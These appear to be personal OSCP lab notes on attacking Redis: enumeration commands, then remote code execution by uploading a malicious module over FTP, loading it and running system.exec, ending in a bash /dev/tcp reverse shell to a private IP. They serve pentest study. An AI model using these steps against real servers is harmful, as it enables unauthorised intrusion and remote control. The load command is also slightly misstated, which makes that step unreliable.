https://blog.1nf1n1ty.team/hacktricks/network-services-pentesting/6379-pentesting-redis

Redis-cli
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `redis-cli -h ${ip} -p 6379`;

dv.paragraph("```bash\n" + command + "\n```");
```

```
INFO
```

```
KEYS *
```

---

SELECT <db_number>

KEYS (*)

1) key1
2) key2
3) key3

get key2
	it will "cat" the value of key2 out in shell
	
---


To complete the RCE attack, there are 2 condition that need to be fulfilled.

- Allow you to upload the module
- Redis-cli without authentication required

https://github.com/n0b0dyCN/RedisModules-ExecuteCommand

Grab precompiled exp.so
```
wget https://github.com/jas502n/Redis-RCE/blob/master/exp_lin.so
```

Enter FTP
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `ftp ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Find writeable Directory, upload exp_lin.so
```
put exp_lin.so
```

Open Redis-CLI
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `redis-cli -h ${ip} -p 6379`;

dv.paragraph("```bash\n" + command + "\n```");
```
Load module
```
LOAD /var/ftp/[directoryname]/exp_lin.so
```

You should see "ok"

Run command
```
system.exec "id"
```

Success.

Reverse Shell connection

On KALI ATTACKER
```
cd ~/Desktop/Tools && python3 penelope.py -p 80 -O / --oscp-safe
```

On VICTIM HOST Redis CLI
```
system.exec "bash -i >& /dev/tcp/192.168.45.232/80 0>&1"
```


---

https://github.com/jas502n/Redis-RCE

can automatically get an interactive shell or a reverse shell in Redis(<=5.0.5).